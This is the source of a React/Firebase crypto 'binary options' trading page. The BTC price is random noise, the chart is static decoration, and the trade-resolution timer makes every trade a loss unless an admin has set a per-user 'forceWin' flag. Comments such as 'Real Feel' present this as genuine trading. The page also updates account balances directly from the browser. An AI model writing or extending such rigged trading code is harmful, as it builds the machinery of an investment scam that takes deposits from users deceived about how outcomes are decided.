"use client"

import { useEffect, useState } from "react"
import { doc, getDoc, addDoc, collection, updateDoc } from "firebase/firestore"
import { db } from "../lib/firebase"

// Payout Tiers (Sec vs Profit %)
const PAYOUT_TIERS: Record<number, number> = {
  60: 30,
  80: 50,
  90: 70,
  120: 85,
  300: 100,
}

export default function TradingPage() {
  const [userData, setUserData] = useState<any>(null)
  const [price, setPrice] = useState(73313)
  const [isModalOpen, setIsModalOpen] = useState(false)
  const [tradeAmount, setTradeAmount] = useState("")
  const [tradeTime, setTradeTime] = useState(60)
  const [tradeDirection, setTradeDirection] = useState<"BUY" | "SELL">("BUY")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [toast, setToast] = useState<{ message: string; type: "success" | "error" } | null>(null)
  const [activeTrade, setActiveTrade] = useState(false) // ✅ Trade chal rahi hai ya nahi

  const getAvailableDurations = () => {
    const amount = Number(tradeAmount) || 0
    if (amount <= 100) return [60]
    if (amount <= 300) return [60, 80]
    if (amount <= 500) return [60, 80, 90]
    return [60, 80, 90, 120, 300]
  }

  useEffect(() => {
    const loadUser = async () => {
      const user = JSON.parse(localStorage.getItem("user") || "{}")
      if (!user.email) return
      const ref = doc(db, "users", user.email)
      const snap = await getDoc(ref)
      if (snap.exists()) setUserData(snap.data())
    }
    loadUser()
  }, [])

  useEffect(() => {
    const interval = setInterval(() => {
      setPrice(prev => Number((prev + (Math.random() * 100 - 50)).toFixed(2)))
    }, 3000)
    return () => clearInterval(interval)
  }, [])

  const openTradeModal = (dir: "BUY" | "SELL") => {
    if (activeTrade) {
      setToast({ message: "Please wait, a trade is already running!", type: "error" })
      return
    }
    setTradeDirection(dir)
    setIsModalOpen(true)
  }

  // ✅ MAIN TRADE EXECUTION WITH TIMER (Real Feel)
  const executeTrade = async () => {
    const amount = Number(tradeAmount)
    if (!amount || amount <= 0) {
      setToast({ message: "Please enter a valid amount!", type: "error" })
      return
    }

    setIsSubmitting(true)
    const user = JSON.parse(localStorage.getItem("user") || "{}")

    try {
      const userRef = doc(db, "users", user.email)
      const userSnap = await getDoc(userRef)
      const currentBalance = userSnap.exists() ? userSnap.data().balance || 0 : 0

      if (amount > currentBalance) {
        setToast({ message: "Insufficient balance!", type: "error" })
        setIsSubmitting(false)
        return
      }

      // 1. Deduct balance immediately
      await updateDoc(userRef, { balance: Number(currentBalance) - amount })

      // 2. Save trade as PENDING
      const tradeRef = await addDoc(collection(db, "trades"), {
        email: user.email || "",
        coin: "BTC/USDT",
        amount: amount,
        direction: tradeDirection,
        duration: tradeTime,
        entryPrice: price,
        payoutPercent: PAYOUT_TIERS[tradeTime] || 30,
        profit: "$0.00",
        adminResult: "PENDING",
        status: "Active",
        createdAt: new Date(),
      })

      setIsModalOpen(false)
      setActiveTrade(true) // Block new trades
      setTradeAmount("")
      setToast({ message: `Trade started! Resolving in ${tradeTime} seconds...`, type: "success" })

      // 3. START TIMER (Real Magic)
      setTimeout(async () => {
        try {
          // Fetch latest user data (Check if admin changed forceWin)
          const freshUserSnap = await getDoc(userRef)
          const freshUserData = freshUserSnap.data()
          const isAdminForceWin = freshUserData?.forceWin === true

          // Decide result
          const result = isAdminForceWin ? "WIN" : "LOSS"
          const payoutPercent = PAYOUT_TIERS[tradeTime] || 30
          const profitAmount = (amount * payoutPercent) / 100
          const finalProfit = result === "WIN" ? `+${profitAmount.toFixed(2)}` : `-${amount.toFixed(2)}`

          let newBalance = Number(freshUserData?.balance) || 0

          if (result === "WIN") {
            newBalance += amount + profitAmount // Add capital + profit
          }

          // Update Trade in Firebase
          await updateDoc(tradeRef, {
            adminResult: result,
            status: "Closed",
            profit: finalProfit
          })

          // Update User Balance
          await updateDoc(userRef, { balance: Number(newBalance.toFixed(2)) })

          // Refresh user data on UI
          const updatedSnap = await getDoc(userRef)
          if (updatedSnap.exists()) setUserData(updatedSnap.data())

          setToast({ 
            message: isAdminForceWin 
              ? `🎉 Trade WIN! Profit: +$${profitAmount.toFixed(2)}` 
              : `📉 Trade LOSS! Lost: -$${amount.toFixed(2)}`, 
            type: isAdminForceWin ? "success" : "error" 
          })
          
          setActiveTrade(false) // Allow new trades
        } catch (error) {
          console.error("Timer resolve error:", error)
          setActiveTrade(false)
        }
      }, tradeTime * 1000) // ✅ Timer (60s = 60000ms)

    } catch (error) {
      console.error("Trade error:", error)
      setToast({ message: "Trade failed. Try again.", type: "error" })
      setIsSubmitting(false)
      setActiveTrade(false)
    } finally {
      setIsSubmitting(false)
    }
  }

  const availableDurations = getAvailableDurations()

  return (
    <main className="min-h-screen bg-[#0B0E11] text-[#EAECEF] font-sans">
      
      {toast && (
        <div className={`fixed top-6 right-6 z-[100] px-6 py-4 rounded-xl shadow-2xl border backdrop-blur-md flex items-center gap-3 animate-slide-in ${
          toast.type === "success" ? "bg-green-900/90 border-green-500/50 text-green-200" : "bg-red-900/90 border-red-500/50 text-red-200"
        }`}>
          <span className="text-xl">{toast.type === "success" ? "✅" : "❌"}</span>
          <span className="font-semibold">{toast.message}</span>
        </div>
      )}

      {/* Trade Modal */}
      {isModalOpen && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-[#1E2329] border border-[#2B3139] rounded-xl w-full max-w-md shadow-2xl overflow-hidden">
            <div className="p-5 border-b border-[#2B3139] flex justify-between items-center bg-[#0B0E11]">
              <h3 className="text-lg font-bold text-white">{tradeDirection === "BUY" ? "▲ Buy Long" : "▼ Sell Short"}</h3>
              <button onClick={() => setIsModalOpen(false)} className="text-[#848E9C] hover:text-white text-xl">✕</button>
            </div>
            
            <div className="p-6 space-y-4">
              <div>
                <label className="text-xs text-[#848E9C] uppercase tracking-wider block mb-2">Price</label>
                <input type="text" value={`$ ${price.toFixed(2)}`} readOnly className="w-full bg-[#0B0E11] border border-[#2B3139] rounded-lg p-3 text-white text-sm font-mono outline-none" />
              </div>
              
              <div>
                <label className="text-xs text-[#848E9C] uppercase tracking-wider block mb-2">Amount (USDT)</label>
                <input 
                  type="number" 
                  placeholder="0.00" 
                  value={tradeAmount}
                  onChange={(e) => setTradeAmount(e.target.value)}
                  className="w-full bg-[#0B0E11] border border-[#2B3139] rounded-lg p-3 text-white text-sm font-mono outline-none focus:border-[#FCD535] transition-colors" 
                />
              </div>

              <div>
                <label className="text-xs text-[#848E9C] uppercase tracking-wider block mb-2">Duration</label>
                <div className="grid grid-cols-3 gap-2">
                  {availableDurations.map(t => (
                    <button 
                      key={t} 
                      onClick={() => setTradeTime(t)}
                      className={`py-2 rounded text-xs font-bold transition-colors ${
                        tradeTime === t ? "bg-[#FCD535] text-black" : "bg-[#0B0E11] text-[#848E9C] border border-[#2B3139] hover:border-[#FCD535]"
                      }`}
                    >
                      {t}s ({PAYOUT_TIERS[t]}%)
                    </button>
                  ))}
                </div>
              </div>

              <button 
                onClick={executeTrade}
                disabled={isSubmitting}
                className={`w-full py-4 rounded-lg font-bold text-base transition-all flex items-center justify-center gap-2 mt-2 ${
                  isSubmitting ? "bg-[#2B3139] text-[#848E9C] cursor-not-allowed" : 
                  tradeDirection === "BUY" ? "bg-[#0ECB81] text-black hover:bg-opacity-90" : "bg-[#F6465D] text-white hover:bg-opacity-90"
                }`}
              >
                {isSubmitting ? (
                  <div className="w-5 h-5 border-2 border-[#848E9C]/30 border-t-[#848E9C] rounded-full animate-spin"></div>
                ) : (
                  `${tradeDirection} BTC/USDT`
                )}
              </button>
            </div>
          </div>
        </div>
      )}

      <div className="grid lg:grid-cols-[1fr_360px] h-screen">
        <div className="flex flex-col border-r border-[#1E2329] overflow-y-auto">
          <div className="p-4 border-b border-[#1E2329] bg-[#0B0E11]">
            <div className="flex flex-wrap items-center gap-4 mb-3">
              <h2 className="text-xl font-bold text-white">BTC/USDT</h2>
              <span className="text-[#F6465D] text-xl font-mono font-bold">${price.toFixed(2)}</span>
              {activeTrade && <span className="text-yellow-400 text-sm animate-pulse">⏳ Trade Running...</span>}
            </div>
          </div>

          <div className="flex-1 bg-[#0B0E11] relative p-4 min-h-[400px]">
             <div className="absolute inset-0">
                {[...Array(10)].map((_, i) => <div key={i} className="absolute w-full border-t border-[#1E2329]" style={{ top: `${i * 10}%` }} />)}
             </div>
             <div className="relative z-10 flex items-end h-full gap-2">
                {[40, 60, 30, 80, 50, 90, 60, 75, 45, 85, 55, 95, 40, 70].map((h, i) => (
                   <div key={i} className="flex-1 flex flex-col items-center justify-end h-full">
                      <div className={`w-full rounded-sm ${i % 2 === 0 ? 'bg-[#0ECB81]' : 'bg-[#F6465D]'}`} style={{ height: `${h}%` }}></div>
                   </div>
                ))}
             </div>
          </div>

          <div className="grid grid-cols-2 gap-3 p-4 border-t border-[#1E2329] bg-[#0B0E11]">
            <button 
              onClick={() => openTradeModal("BUY")}
              className="py-4 rounded-lg bg-[#0ECB81] text-black font-bold text-lg hover:bg-opacity-90 transition-all active:scale-95"
            >
              BUY / LONG
            </button>
            <button 
              onClick={() => openTradeModal("SELL")}
              className="py-4 rounded-lg bg-[#F6465D] text-white font-bold text-lg hover:bg-opacity-90 transition-all active:scale-95"
            >
              SELL / SHORT
            </button>
          </div>
        </div>

        <div className="bg-[#0B0E11] flex flex-col overflow-y-auto hidden lg:flex">
          <div className="p-4 flex-1">
            <h3 className="text-sm font-bold text-[#848E9C] mb-3 uppercase tracking-wider">Account</h3>
            <div className="space-y-3">
              <div className="bg-[#1E2329] p-3 rounded-lg border border-[#2B3139]">
                <p className="text-[#848E9C] text-xs">Wallet Balance</p>
                <p className="text-lg font-bold text-[#FCD535]">${userData?.balance?.toFixed(2) || "0.00"}</p>
              </div>
            </div>
          </div>
        </div>
      </div>

      <style jsx>{`
        @keyframes slide-in {
          from { transform: translateX(100%); opacity: 0; }
          to { transform: translateX(0); opacity: 1; }
        }
        .animate-slide-in {
          animation: slide-in 0.3s ease-out forwards;
        }
      `}</style>
    </main>
  )
}